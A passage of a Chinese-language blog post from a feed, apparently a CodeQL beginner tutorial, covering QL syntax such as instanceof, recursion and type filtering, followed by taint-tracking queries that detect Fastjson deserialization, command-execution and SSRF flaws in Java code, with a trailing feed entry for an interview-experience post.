替代复杂查询语句问题</h3><p>我们在上面的案例当中看到了 <code>instanceof</code>, 如果我们去看ql自带的规则库，会发现大量的 <code>instanceof</code> 语句。</p><p><code>instanceof</code> 这个关键字是用来判断当前的对象，和后面的是否为同一类型。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/instanceof.png" class><p><code>instanceof</code> 是用来优化代码结构非常好的语法糖。</p><p>这种方式的提出其实是用来优化之前使用 <code>exists(|)</code> 匹配对应 Source&#x2F;Sink，如果我们需要写非常多的 <code>exists(|)</code>，这会使得整个项目维护起来非常困难，于是就出现了这一种语法糖 <code>instanceof</code></p><p><code>instanceof</code> 给我们提供了一种机制，我们只需要定义一个 <code>abstract class</code>，比如这个案例当中的 <strong>RemoteFlowSource</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/** A data flow source of remote user input. */</span><br><span class="line">abstract class RemoteFlowSource extends DataFlow::Node &#123;</span><br><span class="line">  /** Gets a string that describes the type of this remote flow source. */</span><br><span class="line">  abstract string getSourceType();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在 <code>isSource</code> 方法里进行 <code>instanceof</code>，判断 src 是 RemoteFlowSource 类型就可以了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">        src instanceof RemoteFlowSource</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>学过 java 的人可能会很费解，我们继承了一个 abstract 抽象类，连个实现方法都没有，怎么就能够达到获取各种 source 的目的呢？</p><p>CodeQL 和 Java 不太一样，只要我们的子类继承了这个 RemoteFlowSource 类，那么所有子类就会被调用，它所代表的 source 也会被加载（让我想起了超级版 Fastjson，这有没有存在 CodeQL 反制一说</p><p>我们在 RemoteFlowSource 定义下面会看到非常多子类，就是这个道理，它们的结果都会被用 and 串联加载。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/autoUsed.png" class><h3 id="递归问题"><a href="#递归问题" class="headerlink" title="递归问题"></a>递归问题</h3><p>简单来说，有如此一段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.l4yn3.microserviceseclab.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">innerOne</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">innerOne</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">innerTwo</span> &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="title function_">innerTwo</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">Nihao</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Nihao&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">Hi</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们想要根据 <code>innerTwo</code> 类定位到最外层的 <code>StudentService</code> 类，怎么实现？</p><p>按照非递归的写法，我们可以这样做：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Class classes</span><br><span class="line">where classes.getName().toString() = &quot;innerTwo&quot;</span><br><span class="line">select classes.getEnclosingType().getEnclosingType() // getEnclosingType 获取作用域</span><br></pre></td></tr></table></figure><p>我们通过连续 2 次调用 <code>getEnclosingType()</code> 方法是能够拿到最外层的 StudentService 的。</p><p>但是正如我们所说，实际情况是我们并不清楚一共有多少层嵌套，而且多个文件可能每个的嵌套数量都不一样，我们没法用确定的调用次数来解决此问题，这个时候我们就需要使用递归的方式解决。</p><p>我们在调用方法后面加 <code>*</code> (从本身开始调用)或者 <code>+</code> (从上一级开始调用)，来解决此问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Class classes</span><br><span class="line">where classes.getName().toString() = &quot;innerTwo&quot;</span><br><span class="line">select classes.getEnclosingType+() // getEnclosingType 获取作用域</span><br></pre></td></tr></table></figure><p>我们也可以自己封装方法来递归调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">RefType demo(Class classes) &#123;</span><br><span class="line">    result = classes.getEnclosingType()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Class classes</span><br><span class="line">where classes.getName().toString() = &quot;innerTwo&quot;</span><br><span class="line">select demo*(classes)</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/SelfDefineRecursion.png" class><h3 id="强制类型转换问题（过滤需要类型）"><a href="#强制类型转换问题（过滤需要类型）" class="headerlink" title="强制类型转换问题（过滤需要类型）"></a>强制类型转换问题（过滤需要类型）</h3><p>强制类型转换这个名字有点拗口，且不太好理解，这里我更愿意把它理解成一种 filter</p><p>在 CodeQL 的规则集里，我们会看到很多类型转换的代码，比如：</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/RefType.png" class><p>我们用如下 QL 语句做个测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Parameter param</span><br><span class="line">select param, param.getType()</span><br></pre></td></tr></table></figure><p>以上代码的含义是打印所有方法参数的名称和类型。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/getTypes.png" class><p>如果其中我们想要单独某个类型的方法参数，这里就需要用到强制类型转换，或者说用到 filter</p><p>使用 <code>RefType()</code> 来测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Parameter param</span><br><span class="line">select param, param.getType().(RefType)</span><br></pre></td></tr></table></figure><p>强制转换成 <code>RefType</code>，意思就是从前面的结果当中过滤出 <code>RefType</code> 类型的参数。</p><p><code>RefType</code> 是什么？引用类型，说白了就是去掉int等基础类型之后的数据。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/RefTypeUse.png" class><p>同理这里肯定并不限于 RefType，也可以是其他的。比如这里保留所有的数值类型参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Parameter param</span><br><span class="line">select param, param.getType().(IntegralType)</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/IntType.png" class><h2 id="0x05-关于其他漏洞点的-CodeQL-语句尝试"><a href="#0x05-关于其他漏洞点的-CodeQL-语句尝试" class="headerlink" title="0x05 关于其他漏洞点的 CodeQL 语句尝试"></a>0x05 关于其他漏洞点的 CodeQL 语句尝试</h2><h3 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h3><p>依样画葫芦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name fastjson-vul</span><br><span class="line"> * @description fastjson-vul</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.QueryInjection</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class FastjsonVulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    FastjsonVulConfig() &#123; this = &quot;fastjson&quot; &#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">        src instanceof RemoteFlowSource</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        exists(Method method, MethodAccess call|</span><br><span class="line">            method.hasName(&quot;parseObject&quot;)</span><br><span class="line">            and</span><br><span class="line">            call.getMethod() = method and</span><br><span class="line">            sink.asExpr() = call.getArgument(0)</span><br><span class="line">            )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from FastjsonVulConfig fastjsonVul, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where fastjsonVul.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/fastjsonVul.png" class><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>写了我一会儿，经过查阅资料发现有直接现成的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name processBuilder-vul</span><br><span class="line"> * @description processBuilder-vul</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"> import java</span><br><span class="line"> import semmle.code.java.dataflow.FlowSources</span><br><span class="line"> import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line"> class RceVulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">     RceVulConfig() &#123; this = &quot;RceVulConfig&quot; &#125;</span><br><span class="line">     </span><br><span class="line">     override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">         src instanceof RemoteFlowSource</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        sink.asExpr() instanceof ArgumentToExec</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> from RceVulConfig rceVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line"> where rceVulConfig.hasFlowPath(source, sink)</span><br><span class="line"> select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><h3 id="SSRF（重点关注）"><a href="#SSRF（重点关注）" class="headerlink" title="SSRF（重点关注）"></a>SSRF（重点关注）</h3><p>这里的内容主要是参考于这篇文章 <a class="link" href="https://forum.butian.net/share/2117">https://forum.butian.net/share/2117<i class="fas fa-external-link-alt"></i></a></p><p>还是觉得关于 SSRF 的 ql 规则这块儿，应该再记录一下，其实在之前看命令执行的 sink 的时候就没追踪到，但是那个时候并没有深入去看。</p><p>最开始我的 ql 语句是这样的<del>（很嫩的 ql 语句）</del></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">         src instanceof RemoteFlowSource</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">         exists(Method method, MethodAccess call|</span><br><span class="line">             method.hasName(&quot;openConnection&quot;)</span><br><span class="line">             and</span><br><span class="line">             call.getMethod() = method and</span><br><span class="line">             sink.asExpr() = call.getArgument(0)</span><br><span class="line">             )</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>追踪 <code>url.openConnection()</code>，但这很明显是追踪不到的，因为 <code>url.openConnection()</code> 是不传参的。那么这一条链路用图来表示的话，断在了这里</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/brokenSSRF.png" class><p>那么中间断的地方我们要想办法接上，这就回到了前文提到过的 <code>isAdditionalTaintStep</code> 方法。从应用角度来说代码应该如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name processBuilder-vul</span><br><span class="line"> * @description processBuilder-vul</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"> import java</span><br><span class="line"> import semmle.code.java.dataflow.FlowSources</span><br><span class="line"> import semmle.code.java.security.QueryInjection</span><br><span class="line"> import DataFlow::PathGraph</span><br><span class="line"> import semmle.code.java.security.RequestForgeryConfig</span><br><span class="line"> </span><br><span class="line"> class SSRFVulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    SSRFVulConfig() &#123; this = &quot;SSRFVulConfig&quot; &#125;</span><br><span class="line">     </span><br><span class="line">     override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">         src instanceof RemoteFlowSource</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        sink instanceof RequestForgerySink</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> from SSRFVulConfig ssrfVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line"> where ssrfVulConfig.hasFlowPath(source, sink)</span><br><span class="line"> select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><p>运行结果</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/SSRFResult.png" class><p>此处 import 了一个新的文件 <code>semmle.code.java.security.RequestForgeryConfig</code>，这里匹配了对应的规则，和之前的命令执行接口是一样的。可以深入看一下对应的实现。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/ssrfSinkRealize.png" class><h4 id="isSource"><a href="#isSource" class="headerlink" title="isSource"></a>isSource</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source instanceof RemoteFlowSource and</span><br><span class="line">    // Exclude results of remote HTTP requests: fetching something else based on that result</span><br><span class="line">    // is no worse than following a redirect returned by the remote server, and typically</span><br><span class="line">    // we&#x27;re requesting a resource via https which we trust to only send us to safe URLs.</span><br><span class="line">    not source.asExpr().(MethodAccess).getCallee() instanceof UrlConnectionGetInputStreamMethod</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>RequestForgeryConfig.qll</code> 规则中的 Source 匹配 <code>RemoteFlowSource</code>，且限定了 <code>java.net.URLConnection.getInputStream()</code> 的输入不为漏洞。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/NotTypeUrlConnection.png" class><p>这里的原因是此处的 <code>getInputStream()</code> 的输入不一定是可控的。</p><h4 id="isSink"><a href="#isSink" class="headerlink" title="isSink"></a>isSink</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123; sink instanceof RequestForgerySink &#125;</span><br></pre></td></tr></table></figure><p>跟进 <code>RequestForgerySink</code></p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/RequestForgerySink.png" class><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/** A data flow sink for server-side request forgery (SSRF) vulnerabilities. */</span><br><span class="line">abstract class RequestForgerySink extends DataFlow::Node &#123; &#125;</span><br><span class="line"></span><br><span class="line">private class UrlOpenSinkAsRequestForgerySink extends RequestForgerySink &#123;</span><br><span class="line">  UrlOpenSinkAsRequestForgerySink() &#123; sinkNode(this, &quot;open-url&quot;) &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private class JdbcUrlSinkAsRequestForgerySink extends RequestForgerySink &#123;</span><br><span class="line">  JdbcUrlSinkAsRequestForgerySink() &#123; sinkNode(this, &quot;jdbc-url&quot;) &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个类都在构造函数里面调用了 <code>sinkNode()</code>，跟进去，对应的文件是 <code>java.dataflow.ExternalFlow.qll</code>。<br>关注到它的注释内容大致意思是在说</p><p><strong>仅供内部使用。这是一个实验API<br>提供用于处理指定的流模型的类和谓词<br>数据扩展和CSV格式</strong></p><p>那么这里的内容，一定是从某个 CSV 文件里面去读取的，这就被定义为 <code>ModelCsv</code> 我们可以简化代码定义 sink、source、flow step，并通过<code>kind</code>来使用它。</p><ul><li>它的格式有这么几种</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Source: (SourceModelCsv)</span><br><span class="line">package; type; subtypes; name; signature; ext; output; kind; provenance</span><br><span class="line"></span><br><span class="line">Sink: (SinkModelCsv)</span><br><span class="line">package; type; subtypes; name; signature; ext; input; kind; provenance</span><br><span class="line"></span><br><span class="line">Summaries: (SummaryModelCsv)</span><br><span class="line">package; type; subtypes; name; signature; ext; input; output; kind; provenance</span><br><span class="line"></span><br><span class="line">Neutrals:</span><br><span class="line">package; type; name; signature; provenan</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/ExternalFlowDescription.png" class><p>每一个参数都代表一个含义，整体来说如下</p><p>package：包名<br>type：选择包中的某个类型<br>subtypes：布尔类型，指示是否跳转到子类<br>name：方法名<br>signature：签名<br>ext：类似于附加类<br>input：输入的位置<br>kind：当前 sink 的类型<br>provenance：来源验证</p><p>这么看的话比较抽象，下文会详细讲解 SSRF 漏洞中所对应的规则。</p><p>目前 CodeQL 官方还并未发布 SinkModelCsv 的一些官方规则，原因是此功能尚不稳定。使用需要开发者&#x2F;安全人员自己定义类，此类需继承 <code>xxxModelCsv</code> 即可应用。</p><p>sinkModelCsv 谓词数据如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">private predicate sinkModelCsv(string row) &#123;</span><br><span class="line">  row =</span><br><span class="line">    [</span><br><span class="line">      // Open URL</span><br><span class="line">      &quot;java.net;URL;false;openConnection;;;Argument[-1];open-url&quot;,</span><br><span class="line">      &quot;java.net;URL;false;openStream;;;Argument[-1];open-url&quot;,</span><br><span class="line">      &quot;java.net.http;HttpRequest;false;newBuilder;;;Argument[0];open-url&quot;,</span><br><span class="line">      &quot;java.net.http;HttpRequest$Builder;false;uri;;;Argument[0];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;URLClassLoader;(URL[]);;Argument[0];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;URLClassLoader;(URL[],ClassLoader);;Argument[0];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;URLClassLoader;(URL[],ClassLoader,URLStreamHandlerFactory);;Argument[0];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;URLClassLoader;(String,URL[],ClassLoader);;Argument[1];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;URLClassLoader;(String,URL[],ClassLoader,URLStreamHandlerFactory);;Argument[1];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;newInstance;;;Argument[0];open-url&quot;,</span><br><span class="line">      // Bean validation</span><br><span class="line">      &quot;javax.validation;ConstraintValidatorContext;true;buildConstraintViolationWithTemplate;;;Argument[0];bean-validation&quot;,</span><br><span class="line">      // Set hostname</span><br><span class="line">      &quot;javax.net.ssl;HttpsURLConnection;true;setDefaultHostnameVerifier;;;Argument[0];set-hostname-verifier&quot;,</span><br><span class="line">      &quot;javax.net.ssl;HttpsURLConnection;true;setHostnameVerifier;;;Argument[0];set-hostname-verifier&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果直接跑 <code>sinkNode()</code> 代码，结果如下</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/sinkNodeRunResult.png" class><p>也就是通过上述的 <code>sinkModuleCsv</code>，其匹配所有 open-url 类型的数据类型。</p><ul><li>但是在新版本的 CodeQL 当中是找不到这一个规则的，在搜索了一堆资料后发现在新版本中是这样的。</li></ul><h4 id="isAdditionalTaintStep"><a href="#isAdditionalTaintStep" class="headerlink" title="isAdditionalTaintStep"></a>isAdditionalTaintStep</h4><p>看一下它的规则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">predicate isAdditionalFlowStep(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">    any(RequestForgeryAdditionalTaintStep r).propagatesTaint(pred, succ)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">// 跟进 RequestForgeryAdditionalTaintStep</span><br><span class="line"></span><br><span class="line">class RequestForgeryAdditionalTaintStep extends Unit &#123;</span><br><span class="line">  /**</span><br><span class="line">   * Holds if the step from `pred` to `succ` should be considered a taint</span><br><span class="line">   * step for server-side request forgery.</span><br><span class="line">   */</span><br><span class="line">  abstract predicate propagatesTaint(DataFlow::Node pred, DataFlow::Node succ);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private class DefaultRequestForgeryAdditionalTaintStep extends RequestForgeryAdditionalTaintStep &#123;</span><br><span class="line">  override predicate propagatesTaint(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">    // propagate to a URI when its host is assigned to</span><br><span class="line">    exists(UriCreation c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)</span><br><span class="line">    or</span><br><span class="line">    // propagate to a URL when its host is assigned to</span><br><span class="line">    exists(UrlConstructorCall c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private class TypePropertiesRequestForgeryAdditionalTaintStep extends RequestForgeryAdditionalTaintStep</span><br><span class="line">&#123;</span><br><span class="line">  override predicate propagatesTaint(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">    exists(MethodAccess ma |</span><br><span class="line">      // Properties props = new Properties();</span><br><span class="line">      // props.setProperty(&quot;jdbcUrl&quot;, tainted);</span><br><span class="line">      // Propagate tainted value to the qualifier `props`</span><br><span class="line">      ma.getMethod() instanceof PropertiesSetPropertyMethod and</span><br><span class="line">      ma.getArgument(0).(CompileTimeConstantExpr).getStringValue() = &quot;jdbcUrl&quot; and</span><br><span class="line">      pred.asExpr() = ma.getArgument(1) and</span><br><span class="line">      succ.asExpr() = ma.getQualifier()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看注释是比较明确的，也就是通过 <code>isAdditionalFlowStep()</code>，将 <code>pred</code> 和 <code>succ</code> 两个点连起来，这里的连接方式是通过污点传递来实现的。具体的匹配方式很容易理解，跟进一下 <code>UriCreation</code> 和 <code>UrlConstructorCall</code> 即可</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;CodeQL · 真入门&lt;/p&gt;</summary>
    
    
    
    <category term="CodeQL" scheme="https://drun1baby.github.io/categories/CodeQL/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
    <category term="CodeQL" scheme="https://drun1baby.github.io/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>2023 春招安全研究岗位面经分享</title>
    <link href="https://drun1baby.github.io/2023/08/23/2023-%E6%98%A5%E6%8B%9B%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E5%B2%97%E4%BD%8D%E9%9D%A2%E7%BB%8F%E5%88%86%E4%BA%AB/"/>
    <id>https://drun1baby.github.io/2023/08/23/2023-%E6%98%A5%E6%8B%9B%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E5%B2%97%E4%BD%8D%E9%9D%A2%E7%BB%8F%E5%88%86%E4%BA%AB/</id>
    <published>2023-08-23T14:39:22.000Z</published>
    <updated>2023-09-03T11:59:59.809Z</updated>
    
